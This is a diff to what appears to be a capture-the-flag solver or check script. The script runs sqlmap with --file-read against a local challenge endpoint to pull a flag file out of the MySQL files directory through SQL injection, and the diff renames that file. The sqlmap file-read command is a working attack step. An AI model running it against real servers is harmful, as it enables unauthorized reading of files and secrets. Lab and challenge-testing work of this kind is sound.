@@ -13,7 +13,7 @@ set -uo pipefail
 BASE="${SEIYAKU_BASE:-http://localhost:8000}"
 FLAG="SEIYAKU{file_privilege_has_no_walls}"
 TARGET="${BASE}/p2/keys?id=1"
-FLAGFILE="/var/lib/mysql-files/groundskeeper.flag"
+FLAGFILE="/var/lib/mysql-files/secret.txt"
 
 WORKDIR=$(mktemp -d)
 LOG="${WORKDIR}/sqlmap.log"
@@ -24,7 +24,7 @@ echo "[p2_8] step 1: sqlmap --file-read=\"${FLAGFILE}\""
 sqlmap -u "$TARGET" -p id --batch --ignore-stdin \
     --file-read="$FLAGFILE" --output-dir="${WORKDIR}/read" \
     2>&1 | tee "${LOG}.read" >/dev/null
-SAVED=$(find "${WORKDIR}/read" -type f -iname "*groundskeeper.flag*" 2>/dev/null | head -1)
+SAVED=$(find "${WORKDIR}/read" -type f -iname "*secret.txt*" 2>/dev/null | head -1)
 if [[ -n "$SAVED" ]] && grep -qF "$FLAG" "$SAVED"; then
     echo "  ok: --file-read recovered the flag from ${FLAGFILE}: ${FLAG}"
 else
